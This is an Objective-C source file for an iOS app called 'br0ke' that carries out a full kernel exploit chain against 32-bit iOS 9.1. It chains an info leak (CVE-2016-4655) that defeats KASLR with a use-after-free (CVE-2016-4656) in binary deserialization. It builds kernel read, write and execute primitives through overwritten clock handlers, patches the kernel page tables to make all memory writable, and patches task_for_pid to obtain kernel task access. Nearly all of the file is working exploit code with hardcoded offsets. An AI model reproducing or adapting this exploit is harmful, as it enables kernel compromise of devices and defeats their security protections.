//
//  ViewController.m
//  br0ke
//
//  Created by iTomsn0w on 1/4/18.
//  Copyright © 2018 Tomi Tokics. All rights reserved.
//

#import "ViewController.h"
#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <assert.h>
#include <pthread.h>
#include <sys/kauth.h>
#include <sys/syscall.h>
#include <sys/stat.h>


unsigned int global_kslide = 0; //global kernel base
bool work = true;
bool once = true;



enum {
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
};


#define kOSSerializeBinarySignature "\323\0\0"

#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)


#define P_MASK 0xfffff000


#define TTB_SIZE            4096

#define L1_SECT_S_BIT       (1 << 16)
#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
#define L1_SECT_APX         (1 << 15) /* Accsess Permission eXetension */
#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

#define L1_PAGE_PROTO       (1 << 0)
#define L1_COARSE_PT        (0xFFFFFC00)

#define PT_SIZE             256

#define L2_PAGE_APX         (1 << 9)




@interface ViewController ()

@property (weak, nonatomic) IBOutlet UIButton *button;




@end

@implementation ViewController


- (void)viewDidLoad {
    [super viewDidLoad];
    
}

const char *lock_last_path_component = "/tmp/lock";
char *lockfile;
int fd;
unsigned char pExploit[128];
int fildes[2];
uint32_t cpipe;
uint32_t pipebuf;


clock_serv_t clk_battery;
clock_serv_t clk_realtime;

vm_offset_t vm_kernel_addrperm;

uint32_t write_gadget;


- (IBAction)thanks:(id)sender {
    
    struct utsname name;
    uname(&name);
    NSString *versionString = [[UIDevice currentDevice]systemVersion];
    
    UIAlertView *alert = [[UIAlertView alloc]initWithTitle:nil message:[NSString stringWithFormat:@"%s\niOS: %@",name.machine,versionString] delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil, nil];
    [alert show];
    
}

- (IBAction)go:(id)sender {
    
    set_up_primitives();
    get_kernel_slide(_button);
    if(work != true){
        [sender setTitle:@"failed!" forState:UIControlStateNormal];
        _button.enabled = NO;
    }else {
        
        [NSThread sleepForTimeInterval:5.0];
        
        
        trigger_uaf(_button);
        
    }
}

void set_up_primitives() {
    
    
    kern_return_t kr;
    
    char *home = getenv("HOME");
    
    lockfile = malloc(strlen(home) + strlen(lock_last_path_component) + 1);
    assert(lockfile);
    
    strcpy(lockfile, home);
    strcat(lockfile, lock_last_path_component);
    
    fd = open(lockfile, O_CREAT | O_WRONLY, 0644);
    assert(fd != -1);
    
    flock(fd, LOCK_EX); //lock the lockfile
    
    assert(pipe(fildes) != -1);
    
    //get the clock services, we will replace these with our custom ones
    kr = host_get_clock_service(mach_host_self(), REALTIME_CLOCK, &clk_realtime);
    if(kr != KERN_SUCCESS) {
        
        printf("[!] Failed to get realtime clock service - %s\n",mach_error_string(kr));
    }
    
    kr = host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &clk_battery);
    if(kr != KERN_SUCCESS) {
        
        printf("[!] Failed to get calendar clock service - %s\n",mach_error_string(kr));
    }
    
    
    
}


unsigned int get_kernel_slide(UIButton *button){
    
    //CVE 2016-4655
    static bool count = false;
    if(count == false){
        NSLog(@"\nStarting CVE 2016-4655");
    }
    unsigned int kslide = 0;
    
    uint32_t dict[] = {
        0x000000d3, // magic number
        kOSSerializeEndCollection | kOSSerializeDictionary | 2, //dict with 2 entrys
        kOSSerializeSymbol | 4,
        0x00414141,
        kOSSerializeEndCollection | kOSSerializeNumber | 0x200, //use 0x1000 to panic
        0x41414141,
        0x41414141
    };
    
    
    size_t idx = sizeof(dict);
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    mach_port_t master = MACH_PORT_NULL, res = MACH_PORT_NULL;
    
    kern_return_t kr = 0, err = 0;
    
    //get iokit master
    
    host_get_io_master_port(mach_host_self(), &master);
    
    //check and validate
    
    kr = io_service_get_matching_services_bin(master,(char*)dict,idx,&res);
    
    serv = IOServiceGetMatchingService(master,IOServiceMatching("AppleKeyStore"));
    
    kr = io_service_open_extended(serv,mach_task_self(),0,NDR_record,(io_buf_ptr_t)dict,idx,&err,&conn);
    
    if (kr == KERN_SUCCESS){
        
        
        if(count == false){
            printf("[*] KERN_SUCCESS at io_service_open_extended\n");
            printf("[*] soon!!\n");
        }
        
    }else{
        
        printf("failed @ io_service_open_extended!\n");
        
        work = false;
        
        
        goto end;
        
    }
    
    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    if(count == false){
        printf("[*] freeing object if there was one...\n");
    }
    io_object_t object = 0;
    
    uint32_t bytes = 0;
    char buf[0x200] = {0};
    
    while (bytes == 0){
        
        if (object){
            
            IOObjectRelease(object);
            
        }
        
        object = IOIteratorNext(iter);
        
        mach_msg_type_number_t bufCnt = 0x200;
        
        kr = io_registry_entry_get_property_bytes(object,(char*)"AAA",(char*)&buf,&bufCnt); //read back the AAA property
        
        bytes = *(uint32_t*)(buf);
        
    }
    
    
    unsigned int kbase = (*(uint32_t *)(buf+36) & 0xFFF00000) + 0x1000; //The slide value will be always the multiple of  1MB(0x100000) so mask it with 0xFFF00000 and adjust by one page because kernel start at: 0x80001000
    
    /* KASLR calc */ kslide = kbase - 0x80001000; //take away 0x80001000 because kernel start at: 0x80001000
    if(count == false){
        printf("[*] Found kernel base at: 0x%x\n",kbase);
        printf("[*] SUCCESS! broke out kaslr, slide is: 0x%x\n\n",kslide);
    }
    count = true;
    
    global_kslide = kbase; //update the global value with the kernel base
    
end:
    
    return kslide;
    
    
}


unsigned char clock_ops_overwrite[] = {
    0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
};

unsigned char uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0x00, 0x00, 0x00, 0x00, // [04] address of clock_ops array in kern memory
    0x00, 0x00, 0x00, 0x00, // [08] address of _copyin
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x00, 0x00, 0x00, 0x00, // [10] address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [14] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0x00, 0x00, 0x00, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
    0x00, 0x00, 0x00, 0x00, // [20] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
};


void *get_payload(void *ptr) {
    
    char stackAnchor;
    uint32_t bufpos;
    char buffer[4096];
    mach_port_t connection;
    kern_return_t result;
    mach_port_t masterPort;
    
    char *p = (char *)((unsigned int)&stackAnchor & P_MASK); //in the start of the kauth_copyinfilesec func they suggest to start with the base pointer
    *(uint32_t *)(p + 0xEC0) = 0x12CC16D; // kauth_filesec.fsec_magic
    
    *(uint32_t *)(p + 0xEE4) = KAUTH_FILESEC_NOACL; // kauth_filesec.fsec_acl.entrycount = -1, to idicate that there are no ACE records
    // kauth_filesec.fsec_acl.acl_ace[...], this is where we will copy our payload
    memcpy((void *)(((unsigned int)&stackAnchor & P_MASK) | 0xEEC), pExploit, 128);
    
    memcpy(buffer, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
    bufpos = sizeof(kOSSerializeBinarySignature);
    
    WRITE_IN(buffer, kOSSerializeDictionary | kOSSerializeEndCollection | 2);
    
    WRITE_IN(buffer, kOSSerializeSymbol | 128);
    for (int i = 0; i < 124; i+=4) { //spawn with aaa
        WRITE_IN(buffer, 0x61616161);
    }
    WRITE_IN(buffer, 0x00616161);
    WRITE_IN(buffer, kOSSerializeNumber | 2048);
    WRITE_IN(buffer, 0x00000004);
    WRITE_IN(buffer, 0X00000000);
    
    WRITE_IN(buffer, kOSSerializeSymbol | 30);
    WRITE_IN(buffer, 0x4b444948); // "HIDKeyboardModifierMappingDst"
    WRITE_IN(buffer, 0x6f627965);
    WRITE_IN(buffer, 0x4d647261);
    WRITE_IN(buffer, 0x6669646f);
    WRITE_IN(buffer, 0x4d726569);
    WRITE_IN(buffer, 0x69707061);
    WRITE_IN(buffer, 0x7344676e);
    WRITE_IN(buffer, 0x00000074);
    WRITE_IN(buffer, kOSSerializeNumber | kOSSerializeEndCollection | 32);
    WRITE_IN(buffer, 0x00000193);
    WRITE_IN(buffer, 0x00000000);
    
    masterPort = kIOMasterPortDefault;
    
    io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));
    
    io_service_open_extended(service, mach_task_self(), 0, NDR_record, buffer, bufpos, &result, &connection);
    if (result != KERN_SUCCESS) {
        printf("err: %d\n", err_get_code(result));
    }
    
    io_object_t object = 0;
    uint32_t size = sizeof(buffer);
    io_iterator_t iterator;
    IORegistryEntryGetChildIterator(service, "IOService", &iterator);
    uint32_t *args = (uint32_t *)ptr;
    uint32_t kernel_base = *args;
    uint32_t payload_ptr = 0;
    
    do {
        if (object) {
            IOObjectRelease(object);
        }
        object = IOIteratorNext(iterator);
    } while (IORegistryEntryGetProperty(object, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", buffer, &size)); //127 a s
    
    payload_ptr = *(uint32_t *)(buffer+16);
    
    
    
    
    
    //The payload, for now only iPad2,7 iOS 9.1
    *(uint32_t *)uaf_payload_buffer = (uint32_t)clock_ops_overwrite;
    *(uint32_t *)(uaf_payload_buffer+0x4) = kernel_base + 0x4053cc;
    *(uint32_t *)(uaf_payload_buffer+0x8) = kernel_base + 0xc7754;
    *(uint32_t *)(uaf_payload_buffer+0x10) = kernel_base + 0x319450 + 1; //+1 to mark it as THUMB
    *(uint32_t *)(uaf_payload_buffer+0x14) = kernel_base + 0xd97d2;
    *(uint32_t *)(uaf_payload_buffer+0x1C) = kernel_base + 0x31bc3c + 1; //+1 to mark it as THUMB
    *(uint32_t *)(uaf_payload_buffer+0x20) = kernel_base + 0xd97d2;
    *(uint32_t *)(uaf_payload_buffer+0x24) = kernel_base + 0xd97d2;
    
    *(uint32_t *)clock_ops_overwrite = kernel_base + 0x319450 + 1; //+1 to mark it as THUMB
    *(uint32_t *)(clock_ops_overwrite+0xC) = kernel_base + 0x1db34 + 1; //+1 to mark it as THUMB
    *(uint32_t *)(clock_ops_overwrite+0x10) = kernel_base + 0xd97d0 + 1; //+1 to mark it as THUMB
    
    memcpy(pExploit+8, uaf_payload_buffer, sizeof(uaf_payload_buffer));
    memcpy(pExploit+8+sizeof(uaf_payload_buffer), clock_ops_overwrite, sizeof(clock_ops_overwrite));
    
    //     kauth_filesec.fsec_acl.acl_ace[...]
    memcpy((void *)(((unsigned int)&stackAnchor & P_MASK) | 0xEEC), pExploit, 128); //now copy the full payload
    
    *(uint32_t *)(args[1]) = payload_ptr;
    int ret = syscall(SYS_open_extended, lockfile, O_WRONLY | O_EXLOCK, KAUTH_UID_NONE, KAUTH_GID_NONE, 0644, p + 0xEC0);
    printf("ret = %d\n",ret);
    assert(ret != -1); //should return 0
    
    return NULL;
}

uint32_t read_primitive(uint32_t address) {
    
    int a;
    unsigned int b;
    
    return clock_get_attributes(clk_battery, address, &a, &b); // ldr r0, [r0]; with the new clock_ops handlers
}


void execute_primitive(uint32_t execute, uint32_t arg1, uint32_t arg2) {
    
    int a;
    unsigned int b;
    char data[64];
    
    write(fildes[1],"AAAABBBB",8); //Dummy, add this to become replacement for OSSerializer
    write(fildes[1], &arg1, 4);
    write(fildes[1], &arg2, 4);
    write(fildes[1], &execute, 4); //address of code to execute
    clock_get_attributes(clk_realtime, pipebuf, &a, &b);
    
    read(fildes[0],data,64);
    
    
}

void write_primitive(uint32_t where, uint32_t what) {
    
    where -= 0xc;
    execute_primitive(write_gadget, where, what);
    
}


void patch_pmap() { //thanks @iBSparkes & @qwertyoruiopz for explaining this to me
    
    
    uint32_t pmap = global_kslide + 0x3f8444;
    uint32_t pmap_store = read_primitive(pmap);
    uint32_t tte_virt = read_primitive(pmap_store);
    uint32_t tte_phys = read_primitive(pmap_store+4);
    
    printf("kernel pmap store @ %#x\n",pmap_store);
    printf("kernel pmap tte is at VA %#x PA %#x\n",tte_virt,tte_phys);
    
    
    for(uint32_t i = 0; i < TTB_SIZE; i++) { //loop through the first level
        uint32_t addr = tte_virt+(i*4);
        uint32_t entry = read_primitive(addr);
        if((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO){ //page entry
            //                             ANDs here to ignore the flags, thanks qwertyoruiop
            uint32_t phys_to_virt = ((entry & L1_COARSE_PT /* L2 entry mask */) - tte_phys) + tte_virt; //phys to virt translation
            for(uint32_t j = 0; j < PT_SIZE; j++) { /* in case of page entries phys address is another set of TTEs, loop through the secod level of descriptors */
                uint32_t addr_2 = phys_to_virt+(j*4);
                uint32_t entry_2 = read_primitive(addr_2);
                if(entry_2) {
                    
                    uint32_t new_entry = entry_2 &= ~L2_PAGE_APX; //unset the accsess permission exetension bit
                    write_primitive(addr_2, new_entry); // write the new value back
                    
                }
                
            }
            
        }else if((entry & L1_SECT_PROTO) == L1_SECT_PROTO) { //block entry, get the data from the entry
            uint32_t new_block_entry = L1_PROTO_TTE(entry);
            new_block_entry &= ~L1_SECT_APX; //unset the accsess permission exetension bit
            write_primitive(addr, new_block_entry); //write the new value back
            
        }
        
    }
    
    //flush these in order to ensure that the memory region is updated with the new permissions
    execute_primitive(0xbcb7c + global_kslide, 0, 0); //flush dcache
    execute_primitive(0xc74e0 + global_kslide, 0, 0); //invalidate TLB
    
    printf("every page is writeable now!\n");
    
    
}


void patch_tfp() {
    
    uint32_t tfp = 0x2fe034 + global_kslide;
    
    uint32_t pid_check = 0x16 + tfp;
    write_primitive(pid_check, read_primitive(pid_check) + 0xff);
    
    uint32_t posix_check = 0x40 + tfp;
    write_primitive(posix_check, read_primitive(posix_check) + 0xff);
    
    uint32_t mac_proc = 0x224 + tfp;
    write_primitive(mac_proc, read_primitive(mac_proc) | 0x10000);
}



unsigned int trigger_uaf(UIButton *go){
    
    //CVE-2016-4656
    
    NSLog(@"\nStarting CVE 2016-4656\n");
    
    uint32_t kernel_base = global_kslide;
    pthread_t insert_payload_thread;
    volatile uint32_t payload_ptr = 0x12345678;
    uint32_t args[] = {kernel_base, (uint32_t)&payload_ptr};
    mach_port_t master = 0, res, port;
    kern_return_t kr, err;
    struct stat buffer;
    
    
    assert(pthread_create(&insert_payload_thread, NULL, &get_payload, args) == 0); //create the new thread
    
    while (payload_ptr == 0x12345678);
    
    
    printf("payload_ptr : %#x\n",payload_ptr);
    
    sleep(1);
    
    
    uint32_t dict[] = {
        
        0x000000d3,
        kOSSerializeDictionary | kOSSerializeEndCollection | 0x10,
        kOSSerializeString | 4,
        0x00414141,
        kOSSerializeData | 0x14,
        payload_ptr+-76+8,
        0x41414141,
        payload_ptr+-76,
        0x00000014,
        kernel_base + 0x319450 + 1,
        kOSSerializeObject | kOSSerializeEndCollection | 1
        
    };
    
    size_t size = sizeof(dict);
    
    
    host_get_io_master(mach_host_self(), &master);
    
    //trigger the bug
    printf("Device might crash now...\n");
    sleep(2);
    kr = io_service_get_matching_services_bin(master, (char*)dict, size, &res);
    if(kr != KERN_SUCCESS){
        printf("dict failed!...");
        printf("kr: %#x\n",kr);
        exit(EXIT_FAILURE);
    }
    printf("kr : 0x%x\n",kr);
    printf("alive?\n");
    printf("really out here\n");
    
    write_gadget = kernel_base + 0xc7488;
    printf("base @ %#x\n",read_primitive(kernel_base));
    assert(read_primitive(kernel_base) == 0xfeedface); //check for the read primitive
    
    vm_kernel_addrperm = read_primitive(kernel_base+0x457030);
    
    
    assert(fstat(fildes[0], &buffer) != -1);
    cpipe = (uint32_t)(buffer.st_ino - vm_kernel_addrperm); //deobfuscate kernel addresses back to their real address values
    
    
    write(fildes[1], "ABCDEFGH", 8);
    assert(read_primitive(cpipe) == 8);
    pipebuf = read_primitive(cpipe+16);
    assert(read_primitive(pipebuf) == 0x44434241); // "ABCD"
    assert(read_primitive(pipebuf+4) == 0x48474645); // "EFGH"
    
    read(fildes[0], (char*)dict, 4096);
    
    //test if the write primitive works
    write_primitive(pipebuf, 0x41414141);
    assert(read_primitive(pipebuf) == 0x41414141);
    
    /* patch kernel pmap */
    
    patch_pmap();
    
    /* test the patch */
    printf("testing pmap patch...\nwriting \"TOMI\" in little-endian mode\n");
    write_primitive(kernel_base, 0x494d4f54); //TOMI
    printf("kernel base : %#x\n",read_primitive(kernel_base));
    assert(read_primitive(kernel_base) == 0x494d4f54);
    printf("writing back the original value...\n");
    write_primitive(kernel_base, 0xfeedface);
    assert(read_primitive(kernel_base) == 0xfeedface);
    printf("pmap patch works! - kernel base : %#x\n",read_primitive(kernel_base));
    
    
    
    err = task_for_pid(mach_task_self(), 0, &port);
    assert(err != KERN_SUCCESS);
    patch_tfp(); //patch tfp
    sleep(1);
    err = task_for_pid(mach_task_self(), 0, &port);
    assert(err == KERN_SUCCESS);
    
    
    printf("tfp0 patch works!\n");
    [go setTitle:@"tfp0 patch applied" forState:UIControlStateNormal];
    [go setEnabled:NO];
    
    
    
    return 0;
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}




@end

